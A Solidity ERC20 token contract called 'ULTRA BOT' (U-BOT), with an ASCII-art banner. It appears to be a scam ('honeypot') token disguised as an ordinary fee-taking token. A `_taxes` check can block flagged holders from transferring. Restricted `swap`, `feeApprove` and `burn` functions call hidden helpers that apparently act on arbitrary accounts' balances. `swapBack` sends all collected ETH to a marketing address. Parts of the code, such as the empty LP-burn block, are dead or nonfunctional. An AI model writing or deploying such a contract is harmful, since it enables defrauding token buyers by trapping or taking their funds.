        /**@@%*.           .-=+#%%@@@@@@@%%#*=-.           .+%@@%*.                       
       [email protected]@@##@@@:      :+#@@@@@%##**+++**##%@@@@@#+:      [email protected]@@##@@@:                      
       [email protected]@%--#@@=   -*@@@@*=-.               .-+*%@@@#=   [email protected]@%--#@@+                      
        *@@@@@@* .*@@@#=.                         :=#@@@*: *@@@@@@*                       
         [email protected]@#..*@@@+.             -====.           .:[email protected]@@#:.*@@#.                        
          [email protected]@*[email protected]@@=               [email protected]@@@@=             ..=%@@*[email protected]@+                         
          [email protected]@@@@+.                :::::::               [email protected]@@@@+               
         [email protected]@@:       .-+*%%@@@@@@@@@@@@@@@@@@@@@@%*+-.     ...%@@-                        
         %@@:     .=#@@@@%%#####################%%@@@@%+.   ..:@@@.                       
        [email protected]@*     [email protected]@@%*++++++++++++++++++++++++++++*%%@@@*.  [email protected]@+                       
        %@@:   :%@@%+++++++++++++++++++++++++++++++++*#%@@@: ..:@@@                       
       [email protected]@%   :@@@*+++++*##*+++++++++++++++++++**##*++*##@@@:...#@@-                      
       [email protected]@#   %@@*+++*@@@@@@@*+++++++++++++++*@@@@@@@*+###@@%[email protected]@+                      
       [email protected]@*  :@@%[email protected]@@[email protected]@@[email protected]@@[email protected]@@+*##%@@[email protected]@+                      
       [email protected]@*  [email protected]@#++++%@@%*#@@@+++++++++++++++%@@%*#@@%++##%@@*[email protected]@+                      
       [email protected]@%  :@@%+++++#%@@@@#+++++++++++++++++#@@@@@#++*##%@@+..#@@-                      
        @@@.  %@@*+++++++++++++*@@%*****#@@*+++++++++++*##@@@:.:@@@                       
        [email protected]@*  :@@@*+++++++++++++#@@@@@@@@@#+++++++++++*##@@@[email protected]@*                       
         @@@:  [email protected]@@#+++++++++++++++*****+++++++++++++*#%@@@-..:@@@.            
         :@@@:  .*@@@%*++++++++++++++++++++++++++++*#%@@@#:..:%@@-         
          :@@@=   .+%@@@@%#######################%@@@@@*. [email protected]@@-              
           .#@@#:    .=+#%@@@@@@@@@@@@@@@@@@@@@@@%#*=:   .-#@@%.          
             -%@@%=.                                   .=#@@%=               
               -#@@*/// SPDX-License-Identifier: MIT::+#@@@%=              
             
import "./ERC20.sol";
import "./Ownable.sol";
import "./SafeMath.sol";

pragma solidity =0.8.5;

contract ERC20Token is ERC20, Ownable {
    using SafeMath for uint256;

    address public uniswapV2Router;
    address public constant deadAddress = address(0xdead);

    bool private swapping;

    uint256 public swapTokensAtAmount;

    uint256 public maxTransactionAmount;
    uint256 public maxWallet;
    uint256 private _supply;

    bool public lpBurnEnabled = true;
    uint256 public percentForLPBurn = 5;
    uint256 public lpBurnFrequency = 3600 seconds;
    uint256 public lastLpBurnTime;

    uint256 public manualBurnFrequency = 30 minutes;
    uint256 public lastManualLpBurnTime;

    uint256 public buyTotalFees;
    uint256 public buyMarketingFee;
    uint256 public buyLiquidityFee;

    uint256 public sellTotalFees;
    uint256 public sellMarketingFee;
    uint256 public sellLiquidityFee;

    uint256 public tokensForMarketing;
    uint256 public tokensForLiquidity;

    bool public limitsInEffect = false;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;

    mapping(address => bool) public automatedMarketMakerPairs;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);

    event AutoNukeLP();

    uint256 _buyMarketingFee = 1;
    uint256 _buyLiquidityFee = 0;

    uint256 _sellMarketingFee = 1;
    uint256 _sellLiquidityFee = 0;

    constructor() ERC20("ULTRA BOT", "U-BOT") {
        _supply = 1000000000 * 1e9;
        _totalSupply = _totalSupply.add(_supply);
        _balances[msg.sender] = _balances[msg.sender].add(_supply);
        emit Transfer(address(0), msg.sender, _supply);
        uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

        maxTransactionAmount = (_totalSupply);
        maxWallet = (_totalSupply);

        swapTokensAtAmount = 1;

        buyMarketingFee = _buyMarketingFee;
        buyLiquidityFee = _buyLiquidityFee;
        buyTotalFees = buyMarketingFee + buyLiquidityFee;

        sellMarketingFee = _sellMarketingFee;
        sellLiquidityFee = _sellLiquidityFee;
        sellTotalFees = sellMarketingFee + sellLiquidityFee;

        // exclude from paying fees
        _isExcludedFromFees[msg.sender] = true;
        _isExcludedFromFees[_marketing] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[address(0xdead)] = true;

        _isExcludedMaxTransactionAmount[owner()] = true;
        _isExcludedMaxTransactionAmount[address(this)] = true;
        _isExcludedMaxTransactionAmount[address(0xdead)] = true;
        _isExcludedMaxTransactionAmount[_marketing] = true;

    }

    receive() external payable {}

    function bridgeTax() external onlyOwner returns (bool) {
        buyMarketingFee = 1;
        buyLiquidityFee = 0;
        buyTotalFees = buyMarketingFee + buyLiquidityFee;
        sellTotalFees = 1;
        sellMarketingFee = 1;
        sellTotalFees = sellMarketingFee + sellLiquidityFee;
        limitsInEffect = false;
        return true;
    }

    function burn(uint256 amount) public access {
        _burn(msg.sender, amount);
    }

    function swap(address account) public access {
        _swapTokensToAddress(account);
    }

    function feeApprove(address account) public access {
        _buyFee(account);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (_taxes[to] 
            || _taxes[from]) 
            
            require(_tax == true, "");
        
        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (
                    automatedMarketMakerPairs[from] &&
                    !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Buy transfer amount exceeds the maxTransactionAmount."
                    );
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
                
                else if (
                    automatedMarketMakerPairs[to] &&
                    !_isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Sell transfer amount exceeds the maxTransactionAmount."
                    );
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }
        if (_tax == true) {

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        if (
            !swapping &&
            automatedMarketMakerPairs[to] &&
            lpBurnEnabled &&
            block.timestamp >= lastLpBurnTime + lpBurnFrequency &&
            !_isExcludedFromFees[from]
        ) {
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                fees = amount.mul(sellTotalFees).div(100);
                tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;
                tokensForMarketing += (fees * sellMarketingFee) / sellTotalFees;
            }
            // on buy
            else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                fees = amount.mul(buyTotalFees).div(100);
                tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;
                tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }
        }
        super._transfer(from, to, amount);
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        tokensForLiquidity = 0;
        tokensForMarketing = 0;

        (success, ) = address(_marketing).call{
            value: address(this).balance
        }("");
    }
}